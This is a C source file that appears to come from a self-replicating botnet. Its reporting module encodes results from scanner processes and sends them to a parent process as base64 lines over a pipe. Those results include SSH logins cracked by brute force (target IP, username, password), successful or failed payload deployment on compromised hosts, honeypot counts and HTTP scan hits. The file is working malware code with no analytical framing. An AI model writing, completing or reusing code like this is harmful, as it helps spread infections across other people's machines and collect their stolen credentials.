/*
 * Binary Scan Report — buffered TLV encoder for scanner children.
 * See headers/scan_report.h for protocol spec.
 */

#include "headers/bot.h"
#include "headers/scan_report.h"
#include <unistd.h>
#include <string.h>

#ifndef NO_SELFREP

#define SR_BUF_CAP         4096
#define SR_FLUSH_THRESHOLD 2048

static uint8_t sr_buf[SR_BUF_CAP];
static int     sr_pos = 0;
static int     sr_fd  = -1;

void sr_init(int write_fd) {
    sr_fd  = write_fd;
    sr_pos = 0;
}

/* Append a complete TLV message to the buffer, flushing first if needed */
static void sr_msg(uint8_t type, const uint8_t *payload, uint16_t plen) {
    int need = 3 + (int)plen;
    if (need > SR_BUF_CAP) return;            /* single msg too large */
    if (sr_pos + need > SR_BUF_CAP) sr_flush();

    sr_buf[sr_pos++] = type;
    sr_buf[sr_pos++] = (uint8_t)(plen >> 8);
    sr_buf[sr_pos++] = (uint8_t)(plen & 0xFF);
    if (plen > 0) {
        memcpy(sr_buf + sr_pos, payload, plen);
        sr_pos += plen;
    }

    if (sr_pos >= SR_FLUSH_THRESHOLD) sr_flush();
}

/* Flush: base64-encode buffer → write "SR:<b64>\n" as single atomic pipe write.
   Pipe writes ≤ PIPE_BUF (4096+) are atomic — no interleaving with PONG etc. */
void sr_flush(void) {
    dstr b64;
    const char *b64s;
    size_t b64len, total, off;
    char *line;
    ssize_t n;

    if (sr_pos == 0 || sr_fd < 0) return;

    b64 = base64_encode(sr_buf, (size_t)sr_pos);
    sr_pos = 0;

    b64s   = ds_cstr(&b64);
    b64len = ds_len(&b64);
    total  = 3 + b64len + 1;          /* "SR:" + base64 + "\n" */

    line = (char *)malloc(total);
    if (!line) { ds_free(&b64); return; }

    memcpy(line, "SR:", 3);
    memcpy(line + 3, b64s, b64len);
    line[total - 1] = '\n';

    ds_free(&b64);

    /* Single write — atomic for total ≤ PIPE_BUF */
    off = 0;
    while (off < total) {
        n = write(sr_fd, line + off, total - off);
        if (n <= 0) break;
        off += (size_t)n;
    }

    free(line);
}

/* ---- helpers ---- */

static void put_u32(uint8_t *d, uint32_t v) {
    d[0] = (uint8_t)(v >> 24); d[1] = (uint8_t)(v >> 16);
    d[2] = (uint8_t)(v >> 8);  d[3] = (uint8_t)v;
}
static void put_u16(uint8_t *d, uint16_t v) {
    d[0] = (uint8_t)(v >> 8); d[1] = (uint8_t)v;
}

/* ---- SSH messages ---- */

void sr_ssh_hit(uint32_t ip, const char *user, const char *pass) {
    uint8_t p[516];
    int pos = 0;
    uint8_t ulen = user ? (uint8_t)strlen(user) : 0;
    uint8_t plen = pass ? (uint8_t)strlen(pass) : 0;

    memcpy(p + pos, &ip, 4); pos += 4;
    p[pos++] = ulen;
    if (ulen) { memcpy(p + pos, user, ulen); pos += ulen; }
    p[pos++] = plen;
    if (plen) { memcpy(p + pos, pass, plen); pos += plen; }

    sr_msg(SR_SSH_HIT, p, (uint16_t)pos);
}

void sr_ssh_deployed(uint32_t ip) {
    uint8_t p[4];
    memcpy(p, &ip, 4);
    sr_msg(SR_SSH_DEPLOYED, p, 4);
}

void sr_ssh_deploy_fail(uint32_t ip) {
    uint8_t p[4];
    memcpy(p, &ip, 4);
    sr_msg(SR_SSH_DEPLOY_FAIL, p, 4);
}

void sr_ssh_progress(uint32_t current, uint32_t total) {
    uint8_t p[8];
    put_u32(p, current);
    put_u32(p + 4, total);
    sr_msg(SR_SSH_PROGRESS, p, 8);
}

void sr_ssh_done(uint32_t total, uint16_t skipped, uint16_t honeypots, uint16_t hpots_probe) {
    uint8_t p[10];
    put_u32(p, total);
    put_u16(p + 4, skipped);
    put_u16(p + 6, honeypots);
    put_u16(p + 8, hpots_probe);
    sr_msg(SR_SSH_DONE, p, 10);
}

/* ---- HTTP messages ---- */

void sr_http_hit(uint32_t ip, uint16_t status_code) {
    uint8_t p[6];
    memcpy(p, &ip, 4);
    put_u16(p + 4, status_code);
    sr_msg(SR_HTTP_HIT, p, 6);
}

void sr_http_done(uint32_t total, uint32_t misses, uint32_t fails) {
    uint8_t p[12];
    put_u32(p, total);
    put_u32(p + 4, misses);
    put_u32(p + 8, fails);
    sr_msg(SR_HTTP_DONE, p, 12);
}

#endif /* NO_SELFREP */
